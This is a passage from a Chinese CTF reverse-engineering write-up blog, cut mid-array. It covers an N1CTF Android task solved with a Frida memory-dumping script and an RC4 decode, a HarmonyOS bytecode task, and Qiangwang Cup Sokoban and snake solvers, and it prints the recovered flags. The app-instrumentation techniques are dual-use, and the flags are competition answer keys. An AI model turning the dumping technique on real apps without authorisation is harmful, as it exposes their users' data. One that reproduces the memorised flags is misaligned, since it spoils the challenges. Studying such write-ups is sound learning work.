创建脚本，那么大胆猜测是加载明文脚本\n\n\n所以可以写一个脚本 dump 所有内存段，然后搜索 Java.use 定位即可\nJava.perform(function() {    setTimeout(function() {        let allMemoryData = [];        let totalSize = 0;                const ranges = Process.enumerateRangesSync({            protection: '---',            coalesce: true        });                for (const range of ranges) {            try {                const current = range.base;                const size = range.size;                console.log(current, size)                const memoryData = Memory.readByteArray(current, size);                if (memoryData) {                    allMemoryData.push(memoryData);                    totalSize += size;                }            } catch {}        }        const finalBuffer = new ArrayBuffer(totalSize);        const finalArray = new Uint8Array(finalBuffer);        let offset = 0;                for (const data of allMemoryData) {            const tempArray = new Uint8Array(data);            finalArray.set(tempArray, offset);            offset += tempArray.length;        }                const timestamp = new Date().getTime();        const filename = `/data/data/com.android.refantazio/memory_dump_${timestamp}.bin`;        const file = new File(filename, \"wb\");        file.write(finalBuffer);        file.flush();        file.close();        console.log(`[+] Saved ${finalBuffer.byteLength} bytes to ${filename}`);    }, 3000)})// /data/data/com.android.refantazio/memory_dump_1731235293045.bin// /data/data/com.android.refantazio/memory_dump_1731235318417.bin\n\n得到转储文件后用 010 去搜\n\n\n就可以秒了\nlet t = [],n = \"n1cTfOwO\".length;for (let e = 0; e &lt; 256; e++) t[e] = e;let o = 0;for (let e = 0; e &lt; 256; e++) o = (o + t[e] + \"n1cTfOwO\".charCodeAt(e % n)) % 256,[t[e], t[o]] = [t[o], t[e]];let r = 0;o = 0;let i = [59, 67, 58, 32, 172, 94, 161, 232, 59, 225, 56, 210, 206, 94, 123, 253, 112, 252, 41, 136, 71, 102, 81, 80, 128, 39, 22, 44, 176, 41, 205, 197, 5, 247, 68, 151, 127, 29, 251, 58, 85];var dt = [];for (let n = 0; n &lt; 41; n++) {    o = (o + t[r = (r + 1) % 256]) % 256,    [t[r], t[o]] = [t[o], t[r]];    let l = t[(t[r] + t[o]) % 256];    dt.push(String.fromCharCode(i[n] ^ l));}console.log(dt.join(\"\"))\n\nBrokenApp一个简单鸿蒙题目，比赛的时候没想到 add xxx 是吧 栈顶取出然后在前面加上 xxx，导致 0 加到了字符串末尾，所以就一直解不出来。。。。。。拿到题目后第一步先反 modules.abc，这里我用的是 abc-decompiler\n\narkjs 层的代码是假的，关键去看 abc.defabc.def 是被魔改了的，我们去 libark_runtime.so 分析一下关键逻辑在这里，先把魔改的头部改回 PANDA，原本是 N1CTF\n\n然后把输入的 flag 填入 abc.def 以 0x1B5A80 开头的 40 个字节，\n\n然后继续加载，abc.def 没法反成 java 代码，所以我用了 abcde 反汇编，然后手动分析\nnewlexenv 2     tryldglobalbyname 0 \"require\"     sta v0     lda.str \"@babel/core\"     sta v1     lda v0     callarg1 1 v1     stconsttoglobalrecord 3 \"babel\"   tryldglobalbyname 4 \"require\"sta v0     lda.str \"@babel/parser\"     sta v1     lda v0     callarg1 5 v1     stconsttoglobalrecord 7 \"parser\"  tryldglobalbyname 8 \"require\"     sta v0     lda.str \"@babel/traverse\"     sta v1     lda v0     callarg1 9 v1     ldobjbyname 11 \"default\"     stconsttoglobalrecord 13 \"traverse\"  tryldglobalbyname 14 \"require\"     sta v0     lda.str \"@babel/types\"     sta v1     lda v0     callarg1 15 v1     stconsttoglobalrecord 17 \"t\"     tryldglobalbyname 18 \"require\"     sta v0     lda.str \"@babel/generator\"     sta v1     lda v0     callarg1 19 v1     ldobjbyname 21 \"default\"     stconsttoglobalrecord 23 \"generator\"    /* 上面都在导库 翻译过来就是const babel = require('@babel/core');const parser = require('@babel/parser');const traverse = require('@babel/traverse').default;const t = require('@babel/types');const generator = require('@babel/generator').default;const fs = require(\"fs\");*/lda.str \"N1CTF{padding_the_flag_here_XXXXXXXXXXX}\"     stconsttoglobalrecord 24 \"FLAG\"     // const FLAG = \"N1CTF{padding_the_flag_here_XXXXXXXXXXX}\"lda.str \"const u = [        \"viKok6\",        \"xznLka\",        ... 这里省略    ];\"     stconsttoglobalrecord 25 \"code\"     /* code = \"    const u = [            \"viKok6\",            \"xznLka\",            ... 这里省略        ]; \"    */createemptyarray 26     stconsttoglobalrecord 27 \"u_\"     // const u_ = [];tryldglobalbyname 28 \"parser\"     sta v0     ldobjbyname 29 \"parse\"     sta v1     tryldglobalbyname 31 \"code\"     sta v2     lda v1     callthis1 32 v0 v2     stconsttoglobalrecord 34 \"ast\"     // const ast = parser.parse(code);tryldglobalbyname 35 \"traverse\"     sta v0     tryldglobalbyname 36 \"ast\"     sta v1     createobjectwithbuffer 37 { 3 [ str:\"enter\", Method:_GLOBAL.#*#enter, MethodAffiliate:1,  ]}     sta v2     lda v0     callargs2 38 v1 v2     /*这里是 调用 traverse, _GLOBAL.#*#enter之类的代码我已经提前翻译好了traverse(ast, {    enter: function(path) {        if (t.isArrayExpression(path.node)) {            path.node.elements.forEach((arg0, arg1) =&gt; {                if (t.isStringLiteral(arg0)) {                    if (arg1 &gt; 150 &amp;&amp; arg1 &lt; 182) {                        const value = arg0.value;                        const index = (arg1 + 2) % 6;                        const result = value[index];                        u_.push(result);                    }                }            });        }    }});*/tryldglobalbyname 40 \"FLAG\"     sta v0     ldobjbyname 41 \"startsWith\"     sta v1     lda.str \"N1CTF{\"     sta v2     lda v1     callthis1 43 v0 v2     sta v0     callruntime.isfalse 45     jnez 27     tryldglobalbyname 46 \"FLAG\"     sta v0     ldobjbyname 47 \"endsWith\"     sta v1     lda.str \"}\"     sta v2     lda v1     callthis1 49 v0 v2     sta v0     lda v0     callruntime.isfalse 51     jnez 107     // if (FLAG.startsWith(\"N1CTF{\") &amp;&amp; FLAG.endsWith(\"}\")) tryldglobalbyname 52 \"FLAG\"     sta v0     ldobjbyname 53 \"substring\"     sta v1     tryldglobalbyname 55 \"FLAG\"     ldobjbyname 56 \"length\"     sta v2     ldai 1     sub2 58 v2     sta v2     ldai 6     sta v3     lda v1     callthis2 59 v0 v3 v2     sta v0 // const flagContent = FLAG.substring(6, FLAG.length - 1);lda.str \"0\"     sta v1     tryldglobalbyname 61 \"u_\"     sta v2     ldobjbyname 62 \"join\"     sta v3     lda.str \"\"     sta v4     lda v3     callthis1 64 v2 v4     add2 66 v1 // 就是这里被坑惨了, arkts 的 add 是 操作数 + 栈顶值, 比赛的时候我是 u_.join(\"\") + \"0\" 死活做不出。。。。。。stricteq 67 v0     callruntime.isfalse 68     // flagContent === \"0\" + u_.join(\"\")    jnez 20     tryldglobalbyname 69 \"print\"     sta v0     lda.str \"You're awesome!\"     sta v1     lda v0     callarg1 70 v1     jmp 18     tryldglobalbyname 72 \"print\"     sta v0     lda.str \"What's wrong?\"     sta v1     lda v0     callarg1 73 v1     ldundefined     returnundefined     /*if (FLAG.startsWith(\"N1CTF{\") &amp;&amp; FLAG.endsWith(\"}\")) {    const flagContent = FLAG.substring(6, FLAG.length - 1);    if (flagContent === \"0\" + u_.join(\"\")) {        print(\"You're awesome!\");    } else {        print(\"What's wrong?\");    }}*/    # _GLOBAL.#*#enternewlexenv 2     lda NewTarget     stlexvar 0 0     lda this     stlexvar 0 1     tryldglobalbyname 0 \"t\"     sta v0     ldobjbyname 1 \"isArrayExpression\"     sta v1     lda arg0     ldobjbyname 3 \"node\"     sta v2     lda v1     callthis1 5 v0 v2     callruntime.isfalse 7     jnez 33     lda arg0     ldobjbyname 8 \"node\"     ldobjbyname 10 \"elements\"     sta v0     ldobjbyname 12 \"forEach\"     sta v1     definefunc 14 this.#*@0*# 2     sta v2     lda v1     callthis1 15 v0 v2     ldundefined     returnundefined    # _GLOBAL.#*@0*#tryldglobalbyname 0 \"t\"sta v0ldobjbyname 1 \"isStringLiteral\"callthis1 3 v0 arg0callruntime.isfalse 5jnez 77ldai 150greater 6 arg1callruntime.isfalse 7jnez 64ldai 182less 8 arg1callruntime.isfalse 9jnez 51tryldglobalbyname 10 \"u_\"sta v0ldobjbyname 11 \"push\"sta v1lda arg0ldobjbyname 13 \"value\"sta v2ldai 2add2 15 arg1sta v3ldai 6mod2 16 v3ldobjbyvalue 17 v2sta v2lda v1callthis1 19 v0 v2ldundefinedreturnundefined\n\nconst babel = require('@babel/core');const parser = require('@babel/parser');const traverse = require('@babel/traverse').default;const t = require('@babel/types');const generator = require('@babel/generator').default;const fs = require(\"fs\");var code = `const u = [        \"viKok6\",        \"xznLka\",        \"DsA1Pd\",        \"55MYVz\",        \"DoUoja\",        ...    ];`;const u_ = [];const ast = parser.parse(code);traverse(ast, {\tenter: function (path) {\t\tif (t.isArrayExpression(path.node)) {\t\t\tpath.node.elements.forEach((arg0, arg1) =&gt; {\t\t\t\tif (t.isStringLiteral(arg0)) {\t\t\t\t\tif (arg1 &gt; 150 &amp;&amp; arg1 &lt; 182) {\t\t\t\t\t\t// console.log(arg0, arg1);\t\t\t\t\t\tconst value = arg0.value;\t\t\t\t\t\tconst index = (arg1 + 2) % 6;\t\t\t\t\t\tconst result = value[index];\t\t\t\t\t\tconsole.log(value, index)\t\t\t\t\t\tu_.push(result);\t\t\t\t\t}\t\t\t\t}\t\t\t});\t\t}\t}});if (FLAG.startsWith(\"N1CTF{\") &amp;&amp; FLAG.endsWith(\"}\")) {\tconst flagContent = FLAG.substring(6, FLAG.length - 1);\tif (flagContent === \"0\" + u_.join(\"\")) {\t\tprint(\"You're awesome!\");\t} else {\t\tprint(\"What's wrong?\");\t}}// N1CTF{0KACtgWmvh3cMAHdUKeRbxfASt7CkBT}\n\n","tags":["Reverse"]},{"title":"2024 强网杯 - Reverse","url":"/2024/11/07/2024qiangwang/","content":"2024 强网杯 Reverse 方向 Writes UP\n\n\n强网的题目还是不错的，不过可惜的是 mips 这题有点手慢了，吃饭前还只有1解，吃完饭就3解了，只能拿个四血了 :(下次再接再厉~\nboxx游戏题\nflag是每个关卡中每个箱子移动的最短的次数拼接的md5码值和几个字符，1.flag{四个字符_md5值}，2.注意同一张图箱子不一定只有一个哦3.同一关需要计算所有箱子的总的最小移动次数，将每一关的最短次数拼接  解释：例如第一关是3第二关是5，就是md5(35...)\n\n\n这是地图数组，14 张 20*20 的地图，\n# # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # #                     # # # # # # ## # #   # # # # # # # #   # # # # # # ## # #   # # # # # # # #   # # # # # # ## # #   # # # # # # # #   # # # # # # ## # #   # # # # # # # #   # # # # # # ## # #   # # # # # # # #   # # # # # # ## # #                     # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # #   # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## #   # # # #   # # # #   # # # # # # ## #   # # # #   # # # #   # # # # # # ## #   # # # #   # # # #   # # # # # # ## #   # # # #   # # # #   # # # # # # ## #   # # # #   # # # #   # # # # # # ## # #   # # #   # # #   # # # # # # # ## # #   # # #   # # #   # # # # # # # ## # #   # #   #   #   # # # # # # # # ## # # #   #   #   #   # # # # # # # # ## # # #   #   #   #   # # # # # # # # ## # # # #   # # #   # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # #   # # # # # # # # # # # # # # # ## # #   # # # # # # # # # # # # # # # ## # #   # # # # # # # # # # # # # # # ## # #   # # # # # # # # # # # # # # # ## # #   # # # # # # # # # # # # # # # ## # #                   # # # # # # # ## # #   # # # # # # #   # # # # # # # ## # #   # # # # # # #   # # # # # # # ## # #   # # # # # # #   # # # # # # # ## # #   # # # # # # #   # # # # # # # ## # #   # # # # # # #   # # # # # # # ## # #   # # # # # # #   # # # # # # # ## # #                   # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # #           # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #   # # #   # # # # # # # ## # # # # # #           # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # #       # # # # # # # # ## # # # # # # #   #   # # # # # # # # ## # # # # # # #   #   # # # # # # # # ## # # # # # # #       # # # # # # # # ## # # # # # # # # # # # # # # # # # # ## # # # # # # # # # # # # # # # # # # #\n\n主程序中只用到了前9张地图，后四张地图打印出来就是上面说的四个字母 qwb!然后写一个脚本来解每张地图\n#include \"bits/stdc++.h\"#include \"map2.h\"using namespace std;const int dx[] = {-1, 1, 0, 0};const int dy[] = {0, 0, -1, 1};struct State {    int playerX, playerY;    vector&lt;pair&lt;int, int&gt;&gt; boxes;    bool operator&lt;(const State &amp;other) const {        if (playerX != other.playerX) return playerX &lt; other.playerX;        if (playerY != other.playerY) return playerY &lt; other.playerY;        return boxes &lt; other.boxes;    }};class SokobanSolver {private:    vector&lt;vector&lt;int&gt;&gt; map;    int n, m;    vector&lt;pair&lt;int, int&gt;&gt; targets;    State initialState;public:    SokobanSolver(vector&lt;vector&lt;int&gt;&gt; &amp;gameMap) {        map = gameMap;        n = map.size();        m = map[0].size();        findInitialState();    }    void findInitialState() {        for (int i = 0; i &lt; n; i++) {            for (int j = 0; j &lt; m; j++) {                if (map[i][j] == 2) {                    initialState.playerX = i;                    initialState.playerY = j;                    map[i][j] = 0;                } else if (map[i][j] == 3) {                    initialState.boxes.push_back({i, j});                    map[i][j] = 0;                } else if (map[i][j] == 4) {                    targets.push_back({i, j});                }            }        }    }    bool isValid(int x, int y) {        return x &gt;= 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; m &amp;&amp; map[x][y] != 1;    }    bool hasBox(const vector&lt;pair&lt;int, int&gt;&gt; &amp;boxes, int x, int y) {        return find(boxes.begin(), boxes.end(), make_pair(x, y)) != boxes.end();    }    vector&lt;int&gt; calculateMinPushes() {        vector&lt;int&gt; result;        std::map&lt;State, int&gt; visited;        queue&lt;State&gt; q;        q.push(initialState);        visited[initialState] = 0;        while (!q.empty()) {            State current = q.front();            q.pop();            int steps = visited[current];            bool allBoxesOnTarget = true;            for (const auto &amp;box: current.boxes) {                bool onTarget = false;                for (const auto &amp;target: targets) {                    if (box == target) {                        onTarget = true;                        break;                    }                }                if (!onTarget) {                    allBoxesOnTarget = false;                    break;                }            }            if (allBoxesOnTarget) {                return {steps};            }            for (int dir = 0; dir &lt; 4; dir++) {                int newPlayerX = current.playerX + dx[dir];                int newPlayerY = current.playerY + dy[dir];                if (!isValid(newPlayerX, newPlayerY)) continue;                vector&lt;pair&lt;int, int&gt;&gt; newBoxes = current.boxes;                bool pushed = false;                for (auto &amp;box: newBoxes) {                    if (box.first == newPlayerX &amp;&amp; box.second == newPlayerY) {                        int newBoxX = box.first + dx[dir];                        int newBoxY = box.second + dy[dir];                        if (!isValid(newBoxX, newBoxY)) continue;                        if (hasBox(newBoxes, newBoxX, newBoxY)) continue;                        box = {newBoxX, newBoxY};                        pushed = true;                        break;                    }                }                State newState = {newPlayerX, newPlayerY, newBoxes};                if (visited.find(newState) == visited.end()) {                    visited[newState] = steps + (pushed ? 1 : 0);                    q.push(newState);                }            }        }        return {-1};    }};void convert_1d_to_3d(int map_22_1d[], int map_22_3d[14][20][20]) {    for (int i = 0; i &lt; 14; i++) {        for (int j = 0; j &lt; 20; j++) {            for (int k = 0; k &lt; 20; k++) {                int index = i * (20 * 20) + j * 20 + k;                if (index &lt; 5600) {                    map_22_3d[i][j][k] = map_22_1d[index];                }            }        }    }}int mapX[14][20][20];int main() {    convert_1d_to_3d(map_22, mapX);    vector&lt;vector&lt;int&gt;&gt; mapX2 = vector&lt;vector&lt;int&gt;&gt;(20, vector&lt;int&gt;(20));    for (int k = 0; k &lt;= 8; ++k) {        for (int i = 0; i &lt; 20; ++i) {            for (int j = 0; j &lt; 20; ++j) {                int code = mapX[k][i][j];                mapX2[i][j] = code;            }        }        SokobanSolver solver(mapX2);        vector&lt;int&gt; result = solver.calculateMinPushes();        cout &lt;&lt; \"case \" &lt;&lt; k &lt;&lt; \" \";        if (result[0] == -1) {            cout &lt;&lt; \"no solution\" &lt;&lt; endl;        } else {            cout &lt;&lt; \"at least \" &lt;&lt; result[0] &lt;&lt; \" times\" &lt;&lt; endl;        }    }    return 0;}/*case 0 at least 2 timescase 1 at least 12 timescase 2 at least 13 timescase 3 at least 9 timescase 4 at least 21 timescase 5 at least 13 timescase 6 at least 25 timescase 7 at least 31 timescase 8 at least 3 times*/// 212139211325313// qwb!_fec2d316d20dbacbe0cdff8fb6ff07b9\n\n斯内克又是一个游戏题，通过 Game over! 定位到最终的比对函数哪里\n\n发现有个 md5 散列和比较，然后还有调用，猜测是个 smc对着 LpAddress 交叉引用发现有一个函数根据按下的按键修改 lpAdress 下的内容得到 smc 解密的目标散列值 9c06c08f882d7981e91d663364ce5e2e\n\n在这里找到了随机数种子 0xDEADBEEF，同时也确定了这就是个根据你的输入内容解密的smc\n\n题目提示 需要选手的操作序列最短，也就是蛇转方向要尽可能的少，搓一个脚本利用 启发式和A*算法 算出蛇的最优转头路线，然后爆破果子的个数，发现枚举到第10个果子的时候 lpAdress 内容的散列值刚好是预期的\n#include \"bits/stdc++.h\"#include \"md5.h\"#include \"defs.h\"using namespace std;enum Direction {    UP,     // W    DOWN,   // S    LEFT,   // A    RIGHT   // D};struct State {    int x, y;           // 蛇头位置    Direction dir;      // 当前方向    string path;        // 路径    int fruitIndex;     // 当前要吃的果子索引    int steps;          // 步数    State(int x, int y, Direction d, string p, int f, int s)            : x(x), y(y), dir(d), path(p), fruitIndex(f), steps(s) {}    bool operator&lt;(const State&amp; other) const {        if (x != other.x) return x &lt; other.x;        if (y != other.y) return y &lt; other.y;        if (dir != other.dir) return dir &lt; other.dir;        return fruitIndex &lt; other.fruitIndex;    }};class SnakePathFinder {private:    const int SIZE = 20;    vector&lt;pair&lt;int, int&gt;&gt; fruits;    bool isValid(int x, int y) {        return x &gt;= 0 &amp;&amp; x &lt; SIZE &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; SIZE;    }    Direction getOppositeDirection(Direction dir) {        switch(dir) {            case UP: return DOWN;            case DOWN: return UP;            case LEFT: return RIGHT;            case RIGHT: return LEFT;        }        return UP;    }    char getDirectionChar(Direction dir) {        switch(dir) {            case UP: return 'W';            case DOWN: return 'S';            case LEFT: return 'A';            case RIGHT: return 'D';        }        return 'W';    }    pair&lt;int, int&gt; moveInDirection(int x, int y, Direction dir) {        switch(dir) {            case UP: return {x-1, y};            case DOWN: return {x+1, y};            case LEFT: return {x, y-1};            case RIGHT: return {x, y+1};        }        return {x, y};    }    // 优化后的启发式估计函数    int estimateRemainingSteps(const State&amp; state) {        if (state.fruitIndex &gt;= fruits.size()) return 0;        int totalEstimate = 0;        int currentX = state.x;        int currentY = state.y;        // 计算到所有剩余果子的最小距离之和        for (int i = state.fruitIndex; i &lt; fruits.size(); i++) {            int dx = abs(currentX - fruits[i].first);            int dy = abs(currentY - fruits[i].second);            // 考虑转向的代价            if (i == state.fruitIndex) {                bool needHorizontalMove = (currentY != fruits[i].second);                bool needVerticalMove = (currentX != fruits[i].first);                if (needHorizontalMove &amp;&amp; needVerticalMove) {                    // 如果需要同时在水平和垂直方向移动，至少需要一次转向                    if ((state.dir == LEFT || state.dir == RIGHT) &amp;&amp; needVerticalMove) {                        totalEstimate += 1;  // 考虑转向的代价                    }                    if ((state.dir == UP || state.dir == DOWN) &amp;&amp; needHorizontalMove) {                        totalEstimate += 1;  // 考虑转向的代价                    }                }            }            totalEstimate += dx + dy;  // 曼哈顿距离            currentX = fruits[i].first;            currentY = fruits[i].second;        }        return totalEstimate;    }public:    SnakePathFinder(const vector&lt;pair&lt;int, int&gt;&gt;&amp; fruitSequence) {        fruits = fruitSequence;    }    string findOptimalPath(int startX, int startY, Direction startDir) {        // 使用优先队列，按照估计的总步数排序        auto cmp = [](const State&amp; a, const State&amp; b) {            return (a.steps + a.path.length()) &gt; (b.steps + b.path.length());        };        priority_queue&lt;State, vector&lt;State&gt;, decltype(cmp)&gt; pq(cmp);        set&lt;State&gt; visited;        State initial(startX, startY, startDir, \"\", 0, 0);        pq.push(initial);        visited.insert(initial);        while(!pq.empty()) {            State current = pq.top();            pq.pop();            // 如果所有果子都被吃掉            if(current.fruitIndex &gt;= fruits.size()) {                return current.path;            }            // 如果到达当前目标果子            if(current.x == fruits[current.fruitIndex].first &amp;&amp;               current.y == fruits[current.fruitIndex].second) {                State nextState = current;                nextState.fruitIndex++;                if(visited.find(nextState) == visited.end()) {                    pq.push(nextState);                    visited.insert(nextState);                }                continue;            }            // 尝试所有可能的方向            for(int i = 0; i &lt; 4; i++) {                Direction newDir = static_cast&lt;Direction&gt;(i);                // 不能直接调头                if(newDir == getOppositeDirection(current.dir)) {                    continue;                }                auto [newX, newY] = moveInDirection(current.x, current.y, newDir);                if(!isValid(newX, newY)) {                    continue;                }                string newPath = current.path;                if(newDir != current.dir) {                    newPath += getDirectionChar(newDir);                }                State newState(newX, newY, newDir, newPath,                               current.fruitIndex, current.steps + 1);                if(visited.find(newState) == visited.end()) {                    pq.push(newState);                    visited.insert(newState);                }            }        }        return \"No path found\";    }};unsigned char map_data_orig[1152] = {        0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0x38, 0x4C, 0xB0, 0x38, 0x6D,        0xEE, 0x3F, 0xC4, 0xB4, 0xB4, 0x09, 0x6A, 0xF0, 0x38, 0x2C, 0x79, 0xF6, 0x34, 0xE9, 0x89, 0x38,        0xAC, 0x7F, 0x35, 0xD4, 0xB4, 0xB4, 0x38, 0x6D, 0x77, 0xF6, 0xB6, 0x38, 0x6D, 0x78, 0xF6, 0xB6,        0x2B, 0x18, 0xB4, 0xB4, 0xB4, 0x3B, 0x81, 0x81, 0x81, 0x81, 0xEF, 0x4E, 0x38, 0x4C, 0x7D, 0xF6,        0x33, 0xD4, 0xB4, 0xB4, 0xB0, 0xE8, 0xF4, 0xB4, 0xB4, 0xB4, 0xB4, 0xB0, 0xE8, 0xF6, 0x2B, 0x27,        0xA3, 0x1D, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xB4, 0xB0, 0xF8, 0x04, 0x38, 0x89,        0xE3, 0xC3, 0xCA, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xC4, 0xB0, 0xF8, 0x04, 0x38,        0xB3, 0x67, 0xE3, 0x16, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xD4, 0xB0, 0xF8, 0x04,        0x38, 0xB6, 0xD3, 0xB6, 0xA9, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xE4, 0xB0, 0xF8,        0x04, 0x38, 0x89, 0xD8, 0xC7, 0x33, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xB4, 0x2B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xB4, 0x38, 0x4C, 0xED, 0xB5, 0xD4, 0xB4, 0xB4, 0x4C,        0xF4, 0xD4, 0x2C, 0xF8, 0x85, 0x37, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xC4, 0x2B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xC4, 0x38, 0x4C, 0xED, 0xB5, 0xD4, 0xB4, 0xB4, 0x4C,        0xF4, 0xD4, 0x2C, 0xF8, 0x85, 0x37, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xD4, 0x2B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xD4, 0x38, 0x4C, 0xED, 0xB5, 0xD4, 0xB4, 0xB4, 0x4C,        0xF4, 0xD4, 0x2C, 0xF8, 0x85, 0x37, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xE4, 0x2B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xE4, 0x38, 0x4C, 0xED, 0xB5, 0xD4, 0xB4, 0xB4, 0x4C,        0xF4, 0xD4, 0x2C, 0xF8, 0x85, 0x37, 0xB0, 0xEC, 0xFE, 0xB4, 0xB4, 0xB4, 0xB4, 0xB4, 0xB4, 0xB4,        0x6F, 0x14, 0x4C, 0xEC, 0xFE, 0xB4, 0xB4, 0xB4, 0x2F, 0xC0, 0x2C, 0xEC, 0xFE, 0xB4, 0xB4, 0xB4,        0xCC, 0x6C, 0xFE, 0xB4, 0xB4, 0xB4, 0xB6, 0x24, 0xCC, 0x72, 0xB4, 0xB4, 0xB4, 0x3B, 0xF4, 0xB4,        0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xB4, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xC4, 0x4C,        0x79, 0x85, 0x37, 0xD0, 0xD2, 0xF4, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xE1, 0xC4, 0x4C,        0xF9, 0x05, 0x37, 0xD0, 0x62, 0x04, 0xE3, 0x60, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xE1,        0xC4, 0xE4, 0x79, 0x05, 0x37, 0x4C, 0xE9, 0xF4, 0xCC, 0xE2, 0xE4, 0x4C, 0xE1, 0x4C, 0xF9, 0xED,        0x38, 0xF8, 0x4C, 0xE8, 0xF4, 0xF8, 0xE4, 0xE0, 0xA8, 0x4C, 0xC1, 0xE3, 0x60, 0xE4, 0x79, 0x04,        0x37, 0x4C, 0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xB4, 0x2C, 0xF8, 0x85, 0x37,        0x4C, 0xE8, 0xF6, 0x4C, 0x69, 0xF4, 0xE4, 0x40, 0x4C, 0xD0, 0x2C, 0xE8, 0xF4, 0x3B, 0xF4, 0xB4,        0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xC4, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xB4, 0x4C,        0x79, 0x85, 0x37, 0xD0, 0xD2, 0xF4, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xE1, 0xB4, 0x4C,        0xF9, 0x05, 0x37, 0xD0, 0x62, 0x04, 0xE3, 0x60, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xE1,        0xB4, 0xE4, 0x79, 0x05, 0x37, 0x4C, 0xE9, 0xF4, 0xD0, 0x62, 0x64, 0xCC, 0xE2, 0xE4, 0x4C, 0xE1,        0x4C, 0xF9, 0xED, 0x38, 0xF8, 0x4C, 0xE8, 0xF4, 0xF8, 0xE4, 0xE0, 0xA8, 0x4C, 0xC1, 0xE3, 0x60,        0xE4, 0x79, 0x04, 0x37, 0x4C, 0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xC4, 0x2C,        0xF8, 0x85, 0x37, 0x52, 0x54, 0x2F, 0x2F, 0x2F, 0xB0, 0xEC, 0x00, 0xB4, 0xB4, 0xB4, 0xB4, 0xB4,        0xB4, 0xB4, 0x6F, 0x14, 0x4C, 0xEC, 0x00, 0xB4, 0xB4, 0xB4, 0x2F, 0xC0, 0x2C, 0xEC, 0x00, 0xB4,        0xB4, 0xB4, 0xCC, 0x6C, 0x00, 0xB4, 0xB4, 0xB4, 0xB6, 0x24, 0xCC, 0x72, 0xB4, 0xB4, 0xB4, 0x3B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xD4, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50,        0xE4, 0x4C, 0x79, 0x85, 0x37, 0xD0, 0xD2, 0xF4, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xE1,        0xE4, 0x4C, 0xF9, 0x05, 0x37, 0xD0, 0x62, 0x04, 0xE3, 0x60, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38,        0x4A, 0xE1, 0xE4, 0xE4, 0x79, 0x05, 0x37, 0x4C, 0xE9, 0xF4, 0xCC, 0xE2, 0xE4, 0x4C, 0xE1, 0x4C,        0xF9, 0xED, 0x38, 0xF8, 0x4C, 0xE8, 0xF4, 0xF8, 0xE4, 0xE0, 0xA8, 0x4C, 0xC1, 0xE3, 0x60, 0xE4,        0x79, 0x04, 0x37, 0x4C, 0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xD4, 0x2C, 0xF8,        0x85, 0x37, 0x4C, 0xE8, 0xF6, 0x4C, 